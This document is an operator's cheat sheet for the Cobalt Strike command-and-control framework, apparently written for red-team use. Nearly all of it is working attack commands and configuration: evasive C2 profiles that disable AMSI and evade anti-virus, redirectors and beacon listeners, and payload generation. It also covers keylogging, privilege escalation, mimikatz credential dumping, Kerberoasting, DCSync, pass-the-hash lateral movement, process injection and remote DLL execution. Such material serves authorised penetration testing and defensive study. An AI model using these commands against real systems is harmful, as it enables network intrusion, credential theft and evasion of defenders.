Cobalt Strike


Use the following install location: /opt/cobaltstrike/
    This will allow you to get third-party apps installed when running /opt/discover/update.sh

- Update
cd /opt/cobaltstrike/
./update

- Install the Arsenal Kit
https://download.cobaltstrike.com/scripts

Includes:
    Artifact Kit - a source code framework to build executables and DLLs that evade some anti-virus products.
    Mimikatz Kit
    Process Injection Kit
    Resource Kit
    Sleep Mask Kit
    User Defined Reflective Loader Kit

Not included:
    Applet Kit
    Elevate Kit
    Power Applet Kit
    Sleep Mask Kit (version 4.4)

cd /home/kali/Downloads/
tar -zxf arsenal-kit20220817.tgz
cd arsenal-kit/
vi arsenal_kit.config                             Make the following changes
include_udrl_kit="true"
include_sleepmask_kit="true"
include_process_inject_kit="true"
include_resource_kit="true"
include_mimikatz_kit="true"

./build_arsenal_kit.sh
cd ..
mv arsenal-kit /opt/cobaltstrike/
------------------------------------------------------------------------------------------------------------------------------------------------------

# Create a random C2 profile

cd third-party/FortyNorthSecurity-C2concealer/
chmod 755 install.sh
./install.sh
C2concealer --variant 3 --hostname target.com
Answer the questions.
This will create a random.profile.
------------------------------------------------------------------------------------------------------------------------------------------------------

# OPSEC: If you manually create a new C2 profile, change the following options:

set host_stage          "false";
set pipename            "changeme_###";           The default SMB Beacon named pipe is msagent_###
set pipename_stager     "changeme_##";            The default is status_##
set ssh_banner          "changeme";               The default SSH banner is Cobalt Strike 4.2
set ssh_pipename        "changeme_####";          The default SSH Beacon named pipe is postex_ssh_####

http-config {
     set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
	header "Server" "Apache";
	header "Keep-Alive" "timeout=10, max=100";
	header "Connection" "Keep-Alive";
	set trust_x_forwarded_for "true";
	set vlock_useragenets "curl*,lynx*,wget*";
}

https-certificate {
	set CN "changgme.com";
	set O "Changgme;
	set L "Changgme";
	set ST "Changgme";
	set C "US";
	set validity "365";
}

post-ex {
    set spawnto_x86      "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64      "%windir%\\sysnative\\dllhost.exe";
    set obfuscate        "true";
    set smartinject      "true";
    set amsi_disable     "true";
    set pipename         "changeme_####, win\\changeme_##";
    set keylogger        "GetAsyncKeyState";
    set threadhint       "module!function+0x##"
}

process-inject {
    set allocator        "NtMapViewOfSection";
    set min_alloc        "17500";
    set startrwx         "false";
    set userwx           "false";

    transform-x64 {
        prepend "\x90\x90";
    }
}

stage {
    set userwx           "false";
    set cleanup          "true";
    set stomppe          "true";
    set obfuscate        "true";
    set name             "changeme.dll";
}

Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for more default settings.

See also:
https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
https://blog.zsec.uk/cobalt-strike-profiles/
------------------------------------------------------------------------------------------------------------------------------------------------------

# Start the team server

Start a screen session: screen -S lee

Parameters in <> are mandatory, those in [] are optional
./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
./teamserver 192.168.1.5 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31

When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.

OPSEC: Always use a Malleable C2 profile.

- Remove old data and Beacons (optional)
Stop the team server.
rm -rf data/
------------------------------------------------------------------------------------------------------------------------------------------------------

# Connecting to the team server

- Locally
Right-click in the Terminal > Split Terminal Horizontally
cd /opt/cobaltstrike/
./cobaltstrike
Host: 127.0.0.1
Port: 50050
User: <your name>
Password: <password you entered above>
Connect
Verify Fingerprint (SHA256 hash from above) > Yes

- Remote connection
OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
Follow the steps from above.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Redirectors

OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.

- Create 3 free Ubuntu instances in the cloud. These instances will be used for the following:
Redirector 1 - domain1
Redirector 2 - domain2
Redirector 3 - DNS (long haul)

- Install socat on each instance
sudo -i
apt-get install -y socat
screen -S lee
socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1/2
socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
------------------------------------------------------------------------------------------------------------------------------------------------------

# Valid SSL certificate for Beacon 

Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store

Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
They will verify that you are who you say are and issue a certificate.
keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store

Import the Root and any Intermediate Certificates that your SSL vendor provides.
keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store

Install your Domain Certificate.
keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
 
Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profiles.
/opt/cobaltstrike/malleable-c2-profiles
------------------------------------------------------------------------------------------------------------------------------------------------------

# Create listeners

Cobalt Strike > Listeners > Add
Name: https
Payload: Beacon HTTPS
HTTP Hosts: click + <redirector1 IP> > OK
Save > OK

Add
Name: https2
Payload: Beacon HTTPS
HTTPS Hosts: click + <redirector2 IP>
Save > OK

Using your domain registar, add the following records for your DNS C2:
@      A    <domain IP>
ns1    A    <domain IP>
data   NS   <domain>.com.

Add
Name: dns
Payload: Beacon DNS
DNS Hosts: click + <redirector3 IP>
Save > OK

OPSEC: Blend in with the named pipes of your target environment.
Find an example using a similar Windows VM: ls \\.\pipe\

Add
Name: smb
Payload: Beacon SMB
Using the example above, change the pipename.
Save

Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
This is needed when the target you compromised cannot directly reach your team server over HTTP/S.
In graph mode, TCP Beacon are shown in green and SMB Beacons are shown in yellow.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Payloads

OPSEC: Staged payloads tend to have more indicators compared to stageless.
Always prefer a fully staged or stageless payload and disable payload staging.
(S) in the framework refers to a stageless payload.

- Disable Windows Defender on your target Windows VM
Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
Standard: Windows Defender settings > turn off Real-time protection

- Attack 1
Attacks > Scripted Web Delivery (S)
URI Path: /a
Listener: select the https listener > Choose
Type: exe
x64: Use x64 payload
Launch > OK

Transfer the payload to your target and execute.
Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

- Attack 2
Payloads > Windows Stageless Payload
Listener: select the https listener > Choose
Output: Raw
x64: Use x64 payload
Generate > Save > OK
Feed this shellcode into a tool like Scarecrow or another loader.

- Troubleshooting
View > Web Log
This is helpful to know when HTTP/S requests are accessing your team server.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Interact with a Beacon

Right-click on a Beacon > Interact
help                                              Show available help commands
help <command>                                    Get more help on a particular command
ctrl +/-                                          Increase or decrease the font size
ctrl k                                            Clear the window

Right-click the X to rename or detach to a floating window.

Cobalt Strike > Script Manger > Load
/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
helpx                                             OPSEC color coded commands

By default, Beacon will check in every 60 seconds.
sleep 0                                           Make a Beacon interactive
sleep 10                                          Make a Beacon call home every 10 seconds
sleep 90 10                                       Make a Beacon call home every 90 seconds with a 10% jitter

- Misc
Use the up arrow to scroll through previous commands.
Beacon is fully tab-completable.
All commands and their output are written to the logs directory.
Right-click on the X in the tab for additional options.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Situational awareness

- Beacon Object File (BOF)
A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process. They run small
commands for a short time.

Cobalt Strike > Script Manger > Load
/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
helpx                                              New commands added to 'help'

whoami
net domain
net user
net computers
net domain_controllers

View > Targets                                    Discovered hosts will populate this tab

ps                                                Show running processes

screenshot <PID> x64                              Take a screenshot (look for svchost from the current user)
                                                  View > Screenshots

keylogger <PID> x64                               Inject a keystroke logger into a process (look for svchost from the current user)
                                                  View > Keystrokes

portscan 10.0.0.1-10.0.0.255 22,80,443,445,1433,3389 none 255
Go to the Targets tab, select all the targets > right-click > Services

Beacon Command Behavior and OPSEC Considerations
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
------------------------------------------------------------------------------------------------------------------------------------------------------

# Clean up

Select a particular Beacon > exit                 Beacon to no longer check in
Right click on the Beacon > Session > Remove      Remove the dead Beacon

Site Management > Manage
Select each line > Kill                           Remove any Scripted Payload Delivery
------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

- Built in
getsystem                                         SYSTEM account impersonation using named pipes
elevate svc-exe                                   Creates a SYSTEM service that will run our payload
elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token

run wmic service get name, pathname               Check for unquoted service paths

- Seatbelt
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user

- SharpUp
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit

- PowerShell weaponization
powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
------------------------------------------------------------------------------------------------------------------------------------------------------

# Credential Abuse

hashdump                                          Recover local account password hashes
logonpasswords                                    Harvest credentials with mimikatz
View > Credentials

execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds

execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump

- Kerberoasting
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast /outfile:hashes.txt

- Double-hop workarounds
1. Use a token that points to a non-network logon session
steal_token <PID>
inject <PID> x64 <listener>

2. Create a new token and logon session that has creds
make_token <domain\user> <password>
spawnas <domain\user> <password> <listener>
pth <domain\user> <hash>

- Mimikatz
::                                                Show parent modules
sekurlsa::                                        Show submodules for a given parent
privilege::debug
token::elevate
sekurlsa::logonPasswords

lsadump::<module>                                 Interact with the Local Security Authority (LSA)
    ::sam                                         Local account hashes from the SAM database using the registry
    ::lsa                                         Local account hashes via the LSA APIs (and domain hashes on DCs)
    ::cache                                       Domain cached credentials on the system
    ::secrets                                     LSA Secrets (ex: service account passwords)
    ::dcsync /user:<domain\user>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement

make_token <domain\user> <password>
ls \\<computer>\C$                                Check to see if you have access
jump <psexec, psexec64, winrm, winrm64> <computer> <listener>

schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
sc \\IP create Service binPath= "command"
wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c beacon.exe"

jump wmi_msbuild <target> <listener>

- Double-hop options
make_token <domain\user> <password>
inject <PID> x64 <listener>
steal_token <PID>
pth <domain\user> <hash>
spawnas <domain\user> <password> <listener>

socks <port>                                      Opens a port on the team server. Be sure to restrict access
proxychains <tool/options>
/etc/proxychains.conf                             Edit your attack VM’s config to your team server IP and port
proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>

jump psexec                                       Run service EXE on remote host
jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
jump winrm                                        Run a PowerShell script via WinRM on remote host
remote-exec <any of the above>                    Run a single command using the above methods on remote host

powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
powerpick get-domainuser <user>
powerpick Get-DomainComputer -Ping -Properties dnshostname
powerpick Get-NetLocalGroupMember <computer>      List the local administrators group on a computer
------------------------------------------------------------------------------------------------------------------------------------------------------

# Process injection

ps                                                Look for another user that is logged in
inject <PID> <arch> <listener>
dllinject <PID>                                   Reflective DLL injection
dllload <PID>                                     Loading an on-disk DLL to memory
spawnto <arch> <full-exe-path>                    Process hollowing
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remotely execute a DLL

upload /tmp/beacon.dll                            Upload your malicious DLL
ls                                                Verify it was uploadted
remote-exec wmi <FQDN> rundll32 c:\windows\temp\beacon.dll,start
